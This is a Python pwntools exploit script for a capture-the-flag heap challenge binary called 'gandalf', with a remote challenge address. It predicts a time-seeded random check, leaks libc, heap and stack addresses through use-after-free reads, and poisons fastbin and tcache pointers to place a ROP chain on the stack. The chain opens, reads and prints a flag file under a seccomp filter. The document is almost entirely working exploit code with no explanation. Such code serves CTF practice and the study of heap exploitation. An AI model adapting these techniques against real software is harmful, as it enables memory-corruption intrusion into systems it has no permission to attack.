#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './gandalf_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# call to malloc
# breakrva 0x2be0

# breakrva 0x2c4f
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec gandalf
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

# └──╼ [★]$ sudo seccomp-tools dump ./gandalf
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
#  0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
#  0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
#  0008: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0010
#  0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
#  0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0011: 0x06 0x00 0x00 0x00000000  return KILL

SOME_GLOBAL = 0x0000108a 
def gen_rand():
    lib.srand(lib.time(None))

    iVar2 = lib.rand()
    iVar2 = SOME_GLOBAL + (SOME_GLOBAL ^ iVar2  % 0x2ad) * 7
    uVar1 = SOME_GLOBAL * 3;
    iVar3 = lib.rand()
    iVar2 = (uVar1 ^ iVar2 % 10000) + iVar3 % 100
    if (iVar2 < 0):
        iVar2 = -iVar2
    return iVar2 % 10000

def alloc(idx, size, data):
    io.sendlineafter(b'$', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())
    io.sendafter(b'>>', data)

def free(idx):
    io.sendlineafter(b'$', b'3')
    io.sendlineafter(b':', str(idx).encode())

def show(idx):
    io.sendlineafter(b'$', b'1')
    io.sendlineafter(b':', str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    POP_RDX_RBX = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
    SYSCALL_RET = rop.find_gadget(['syscall', 'ret'])[0]

    io.recvuntil(b'[+]')
    
    io.sendlineafter(b'[!]', b'2')
    num = gen_rand()
    io.sendlineafter(b'[$]', str(num).encode())

    # clean bins
    for _ in range(16):
        alloc(0, 0x20-0x10, b'a\n')
    for _ in range(16):
        alloc(0, 0x70-0x10, b'a\n')
    for _ in range(15):
        alloc(0, 0x80-0x10, b'a\n')
    for _ in range(5):
        alloc(0, 0xd0-0x10, b'a\n')
    for _ in range(2):
        alloc(0, 0xf0-0x10, b'a\n')

    alloc(0, 0x410, b'idk\n')
    alloc(1, 0x10, b'guard\n')
    free(0)
    show(0)
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x219ce0

    POP_RDI = libc.address + POP_RDI
    POP_RSI = libc.address + POP_RSI
    POP_RAX = libc.address + POP_RAX
    POP_RDX_RBX = libc.address + POP_RDX_RBX
    SYSCALL_RET = libc.address + SYSCALL_RET

    alloc(0, 0x410, b'idk\n')
    free(1)
    show(1)
    heap = (u64(io.recvline().strip().ljust(8, b'\x00')) - 1) << 12

    # fastbin attack to control tcache->next
    for i in range(9):
        alloc(i, 0x10, b'a\n')
    for i in range(9):
        free(i)
    free(7)
    for i in range(7):
        alloc(i, 0x10, b'a\n')
    alloc(7, 0x10, p64(mangle(heap+0x1b10, libc.sym['environ'])) + b'\n')
    alloc(8, 0x10, b'a\n')
    alloc(9, 0x10, b'a\n')
    alloc(10, 0x0, b'')

    show(10)
    stack = u64(io.recvline().strip().ljust(8, b'\x00'))
    rip = stack - 0x150

    # fastbin to ROP
    for i in range(9):
        alloc(i, 0x70, b'a\n')
    for i in range(9):
        free(i)
    free(7)
    for i in range(7):
        alloc(i, 0x70, b'a\n')
    alloc(7, 0x70, p64(mangle(heap+0x1b10, rip-0x8)) + b'\n')
    alloc(8, 0x70, b'./flag.txt\x00\n') # heap+0x1f50
    alloc(9, 0x70, b'a\n')

    payload = flat([
        0x0,
        POP_RDI,
        0x0,
        POP_RSI,
        stack-0x100,
        POP_RDX_RBX,
        0x400,
        0x0,
        POP_RAX,
        0x0,
        SYSCALL_RET,
    ])
    pause() if args.GDB else None
    alloc(10, 0x70, payload + b'\n')

    payload = flat([
        POP_RDI,
        heap+0x1f50,
        POP_RSI,
        0x0,
        POP_RAX,
        0x2,
        SYSCALL_RET,

        POP_RDI,
        0x3,
        POP_RSI,
        stack,
        POP_RDX_RBX,
        0x100,
        0x0,
        POP_RAX,
        0x0,
        SYSCALL_RET,

        POP_RDI,
        0x1,
        POP_RAX,
        0x1,        
        SYSCALL_RET
    ])
    io.send(payload)

    log.success("libc base: %#x", libc.address)
    log.success("heap base; %#x", heap)
    log.success("stack: %#x", stack)
    log.success("rip: %#x", rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
